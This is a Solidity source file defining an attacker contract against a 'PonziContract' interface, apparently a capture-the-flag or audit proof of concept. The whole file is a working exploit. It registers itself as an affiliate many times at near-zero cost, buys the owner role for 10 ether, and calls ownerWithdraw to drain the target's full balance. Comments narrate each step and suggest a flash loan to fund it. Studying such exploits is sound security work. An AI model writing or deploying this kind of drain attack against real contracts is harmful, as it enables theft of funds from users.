// SPDX-License-Identifier: MIT 
pragma solidity >=0.8.0;


import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "hardhat/console.sol";

interface IPonzi {
    function affiliatesCount() external returns (uint256);

    function joinPonzi(address[] calldata _afilliates) external payable;

    function buyOwnerRole(address newAdmin) external payable;

    function ownerWithdraw(address to, uint256 amount) external;
}

contract AttackerContract {
    address[] affiliates_;
    IPonzi ip;

    constructor(address _target) {
        ip = IPonzi(_target);
    }

    // In order to this to work we need to assume that the owner of PonziContract has funds inside and the attacker has 10 ethers, he can easily get this amount through a flash loan
    function stealEtherandOwnerShip() external payable {
        require(msg.value == 10 ether, "Insufficient Ether");

        uint256 count = ip.affiliatesCount();
        for (uint256 i = 0; i < count; i++) {
            affiliates_.push(address(this));
        }

        //become an affiliate by calling the joinPonzi function, you can become one by practically no cost since your will be transfer back to you
        ip.joinPonzi{value: count * 1 ether}(affiliates_);

        //now that you are affiliate with practically no cost you can now purchase owner role for 10 ether, dont worry you will be able to get these ether back in the next function
        ip.buyOwnerRole{value: 10 ether}(address(this));

        //now that you have owner rights you can withdraw all the funds within the contract including the 10 ether you gave to buy ownerhship
        uint256 balance = address(ip).balance;
        ip.ownerWithdraw(address(this), balance);

        // now you have drained the whole contract with practically no cost
    }

    receive() external payable {}
}
